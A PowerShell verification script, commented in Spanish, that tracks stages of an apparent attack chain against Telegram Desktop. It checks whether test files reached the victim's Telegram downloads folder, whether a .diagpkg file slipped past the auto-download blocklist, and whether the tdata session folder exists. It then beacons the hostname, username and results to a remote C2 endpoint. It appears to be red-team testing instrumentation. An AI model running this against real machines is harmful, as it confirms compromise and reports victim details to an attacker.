# VERIFICAR-H2.ps1 — instrumenta cada eslabon del carril H2 desde la maquina victima
# Uso:
#   VERIFICAR-H2.ps1 -Etapa T1 [-Archivo prueba.html]
#   VERIFICAR-H2.ps1 -Etapa T2 [-Archivo prueba.bat]
#   VERIFICAR-H2.ps1 -Etapa T3 [-Archivo regalo.diagpkg]
#   VERIFICAR-H2.ps1 -Etapa SELFTEST   (verifica beacon y tdata, sin archivos)
# Cada etapa envia un marcador al C2 (consola RC-T20, pestana 06 H2):
#   H2-T1-ENTREGA-OK / H2-T1-NEGADO   -> E1
#   H2-T2-DEFENSA-OK / H2-T2-PERMITIDO (este ultimo = la defensa NO freno: grave)
#   H2-T3-BYPASS-OK / H2-T3-NEGADO    -> E2
#   H2-EXEC (disparado por el pack)    -> E3
param(
  [Parameter(Mandatory=$true)][string]$Etapa,
  [string]$Archivo = ""
)

$B = 'https://base44.app/api/apps/6adf94f1acf3e7f34620d98d/functions/t20Beacon'
$Desc = Join-Path ([Environment]::GetFolderPath('UserProfile')) 'Downloads\Telegram Desktop'
$host_ = $env:COMPUTERNAME
$user_ = $env:USERNAME
$tdata = Test-Path "$env:APPDATA\Telegram Desktop\tdata"

function Beacon([string]$marker, [string]$extra) {
  $body = @{ marker = $marker; ua = "h2-verifier"; extra = "$extra" } | ConvertTo-Json -Compress
  try {
    Invoke-RestMethod -Method Post -Uri $B -ContentType 'text/plain' -Body $body | Out-Null
    Write-Host "  -> beacon enviado: $marker" -ForegroundColor Green
  } catch { Write-Host "  -> FALLO el beacon: $($_.Exception.Message)" -ForegroundColor Red }
}

Write-Host "== VERIFICADOR H2 · $host_ / $user_ / tdata=$tdata ==" -ForegroundColor Cyan
Write-Host "   carpeta objetivo: $Desc"

switch ($Etapa.ToUpper()) {

  'SELFTEST' {
    Beacon 'H2-SELFTEST' "host=$host_|user=$user_|tdata=$tdata|ps=$($PSVersionTable.PSVersion)"
    Write-Host "Si la consola no muestra H2-SELFTEST en 10s, revisa internet." -ForegroundColor Yellow
  }

  { $_ -in 'T1','T2','T3' } {
    if (-not $Archivo) { Write-Host "falta -Archivo <nombre>"; exit 1 }
    $full = Join-Path $Desc $Archivo
    $markerBase = @{ 'T1'='H2-T1-ENTREGA'; 'T2'='H2-T2-DEFENSA'; 'T3'='H2-T3-BYPASS' }[$Etapa]
    if (Test-Path $full) {
      $sz = (Get-Item $full).Length
      $motw = $null
      try { $motw = [bool](Get-Item $full -Stream 'Zone.Identifier' -ErrorAction SilentlyContinue) } catch {}
      Write-Host "  ENCONTRADO: $Archivo ($sz bytes) en la carpeta de Telegram" -ForegroundColor Green
      Beacon "${markerBase}-OK" "host=$host_|user=$user_|archivo=$Archivo|bytes=$sz|motw=$motw"
      if ($Etapa -eq 'T2') { Write-Host "  !!! La defensa NO freno un .bat: DetectNameType no aplica" -ForegroundColor Red }
      if ($Etapa -eq 'T3') { Write-Host "  BYPASS CONFIRMADO: .diagpkg pasa la blocklist de auto-descarga" -ForegroundColor Red }
    } else {
      Write-Host "  NO esta en la carpeta: $Archivo" -ForegroundColor Yellow
      Beacon "${markerBase}-NEGADO" "host=$host_|user=$user_|archivo=$Archivo|ausente=1"
      if ($Etapa -eq 'T2') { Write-Host "  Correcto: la defensa freno el .bat (control OK)" -ForegroundColor Green }
      if ($Etapa -eq 'T3') { Write-Host "  El .diagpkg no bajo solo: no hay bypass (o auto-descarga desactivada)." }
    }
  }

  default { Write-Host "etapa invalida: $Etapa (usar T1, T2, T3 o SELFTEST)"; exit 1 }
}
Write-Host "== listo. La consola (pestana 06 H2) refleja cada etapa en segundos =="
